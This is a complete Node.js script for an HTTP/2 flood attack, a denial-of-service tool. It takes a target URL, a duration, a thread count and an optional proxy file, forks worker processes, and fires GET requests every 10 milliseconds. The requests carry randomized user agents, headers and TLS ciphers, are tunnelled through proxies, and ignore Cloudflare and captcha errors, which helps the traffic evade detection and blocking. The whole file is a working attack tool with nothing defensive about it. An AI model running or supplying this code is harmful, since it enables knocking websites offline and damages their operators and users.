const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fakeua = require('fake-useragent');

const cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
];

const acceptHeaderOptions = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const langHeaderOptions = [
    'en-US,en;q=0.9',
    'fr-CH, fr;q=0.9, en;q=0.8',
    'de-DE,de;q=0.7,en-US;q=0.5,en;q=0.3',
];

const encodingHeaderOptions = [
    'gzip, deflate, br',
    'gzip;q=1.0, deflate;q=0.6, br;q=0.1',
];

const controlHeaderOptions = [
    'max-age=604800, no-cache',
    'no-store, no-transform',
    'only-if-cached, max-age=0',
];

const ignoreErrorNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'];
const ignoreErrorCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

// Helper: Random item from array
function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// Generate headers for each request
function generateHeaders(targetHost) {
    return {
        ':method': 'GET',
        ':path': '/',
        'Host': targetHost,
        'User-Agent': fakeua(),
        'Accept': randomChoice(acceptHeaderOptions),
        'Accept-Language': randomChoice(langHeaderOptions),
        'Accept-Encoding': randomChoice(encodingHeaderOptions),
        'Cache-Control': randomChoice(controlHeaderOptions),
        'Origin': targetHost,
    };
}

// Statistics object
const stats = {
    success: 0,
    errors: 0,
    requests: 0,
};

// Main flood function per thread
function flood(targetUrl, proxies) {
    const parsedUrl = url.parse(targetUrl);
    const selectedCipher = randomChoice(cplist);
    const proxy = proxies.length > 0 ? randomChoice(proxies) : null;
    let headers = generateHeaders(parsedUrl.host);

    function makeRequest() {
        try {
            // Set up HTTP CONNECT tunneling through proxy if proxy specified
            if (proxy) {
                const proxyParsed = url.parse(proxy);
                const req = http.request({
                    host: proxyParsed.hostname,
                    port: proxyParsed.port || 8080,
                    method: 'CONNECT',
                    path: `${parsedUrl.hostname}:443`,
                    headers: { 'Proxy-Connection': 'Keep-Alive' }
                });

                req.on('connect', (res, socket) => {
                    if (res.statusCode === 200) {
                        // Establish TLS connection over socket via the proxy
                        const secureSocket = tls.connect({
                            socket: socket,
                            servername: parsedUrl.hostname,
                            ciphers: selectedCipher,
                            minVersion: 'TLSv1.2',
                            maxVersion: 'TLSv1.3',
                            rejectUnauthorized: false,
                            ALPNProtocols: ['h2']
                        }, () => {
                            const client = http2.connect(parsedUrl.href, { createConnection: () => secureSocket });
                            const req2 = client.request(headers);

                            req2.on('response', () => {
                                stats.success++;
                                req2.close();
                                client.close();
                            });

                            req2.setEncoding('utf8');
                            req2.on('data', () => {});
                            req2.on('error', () => { stats.errors++; });
                            req2.end();
                        });

                        secureSocket.on('error', () => { stats.errors++; });
                    } else {
                        stats.errors++;
                    }
                });

                req.on('error', () => { stats.errors++; });
                req.end();
            } else {
                // Direct connection without proxy
                const client = http2.connect(parsedUrl.href, {
                    ciphers: selectedCipher,
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2']
                });

                client.on('error', () => { stats.errors++; });

                const req2 = client.request(headers);

                req2.on('response', () => {
                    stats.success++;
                    req2.close();
                    client.close();
                });

                req2.setEncoding('utf8');
                req2.on('data', () => {});
                req2.on('error', () => { stats.errors++; });
                req2.end();
            }

            stats.requests++;
        } catch (e) {
            if (!ignoreErrorNames.includes(e.name) && !ignoreErrorCodes.includes(e.code)) {
                console.error('Unhandled error:', e);
            }
            stats.errors++;
        }
    }

    // Flood continuously
    setInterval(makeRequest, 10);
}

if (cluster.isMaster) {
    const args = process.argv.slice(2);

    if (args.length < 3) {
        console.error('Usage: node white.js <target_url> <duration_seconds> <thread_count> [proxy_file]');
        process.exit(1);
    }

    const targetUrl = args[0];
    const duration = parseInt(args[1], 10) * 1000;
    const threadCount = parseInt(args[2], 10);
    let proxies = [];

    if (args[3]) {
        try {
            proxies = fs.readFileSync(args[3], 'utf8').split(/\r?\n/).filter(Boolean);
        } catch (e) {
            console.error('Failed to read proxy file, continuing without proxy:', e.message);
        }
    }

    console.log(`Starting attack on ${targetUrl} with ${threadCount} threads for ${duration / 1000} seconds.`);

    for (let i = 0; i < threadCount; i++) {
        cluster.fork();
    }

    // Show stats every 5 seconds
    setInterval(() => {
        console.log(`Stats - Requests: ${stats.requests} Successful: ${stats.success} Errors: ${stats.errors}`);
    }, 5000);

    // Stop after duration
    setTimeout(() => {
        console.log('Attack completed.');
        process.exit(0);
    }, duration);

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died, restarting...`);
        cluster.fork();
    });
} else {
    // Worker process: start flooding
    const targetUrl = process.argv[2];
    const proxies = process.argv[5] ? fs.readFileSync(process.argv[5], 'utf8').split(/\r?\n/).filter(Boolean) : [];
    flood(targetUrl, proxies);
}
